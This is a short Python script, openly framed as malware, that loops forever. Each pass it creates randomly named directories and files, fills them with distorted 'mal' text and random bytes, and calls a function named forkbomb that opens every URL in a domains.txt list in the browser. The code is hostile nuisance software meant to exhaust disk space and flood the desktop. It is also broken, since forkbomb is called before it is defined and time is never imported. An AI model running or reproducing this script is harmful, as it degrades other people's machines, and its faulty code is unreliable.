import os
import random
mal = True
malwar = "m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̛̔́̉́̽̄́̌͆̎̎̀̚͘a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜"
randomlet = ["A", "a", "B", "b", "C", "c", "D", "d", "E", "e", "F", "f", "G", "g", "H", "h", "I", "i", "J", "j", "K", "k", "L", "l", "M","m", "N", "n", "O", "o", "P", "p", "Q", "q", "R", "r", "S", "S", "T", "t", "U", "u", "V", "v", "W", "x", "Y", "y", "Z", "z"]
randonum = ["1", "2", "3", "4", "5", "6", "7", "8", "9"]
while mal == True:
    random1 = random.choice(randomlet)
    random2 = random.choice(randonum)
    random3 = random.choice(randonum)
    random4 = random.choice(randonum)
    os.system("clear")
    directory = "mal-" + random1 + str(random2) + str(random3) + str(random4)
    os.system("mkdir " + directory)
    os.system("touch " + directory + "/mal-" + random1 + str(random2) + str(random3) + str(random4))
    with open(os.getcwd() + "/" + directory + "/mal-" + random1 + str(random2) + str(random3) + str(random4), "a") as file:
      file.write(malwar + str(random.randbytes(999)))
    print(malwar)
    forkbomb()

def forkbomb():
  file = open("domains.txt", "r")
  content = file.readlines()
  for line in content:
    time.sleep(5)
    os.system("xdg-open https://" + line)
